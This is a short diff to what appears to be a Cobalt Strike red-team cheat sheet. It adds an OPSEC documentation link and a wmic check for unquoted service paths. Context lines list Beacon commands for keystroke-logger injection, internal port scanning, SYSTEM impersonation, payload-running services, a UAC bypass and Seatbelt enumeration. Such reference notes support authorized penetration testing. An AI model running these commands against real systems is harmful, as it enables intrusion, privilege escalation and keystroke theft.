@@ -312,6 +312,9 @@ keylogger <PID> x64                               Inject a keystroke logger into
 
 portscan 10.0.0.1-10.0.0.255 22,80,443,445,1433,3389 none 255
 Go to the Targets tab, select all the targets > right-click > Services
+
+Beacon Command Behavior and OPSEC Considerations
+https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Clean up
@@ -329,6 +332,8 @@ Select each line > Kill                           Remove any Scripted Payload De
 getsystem                                         SYSTEM account impersonation using named pipes
 elevate svc-exe                                   Creates a SYSTEM service that will run our payload
 elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
+
+run wmic service get name, pathname               Check for unquoted service paths
 
 - Seatbelt
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
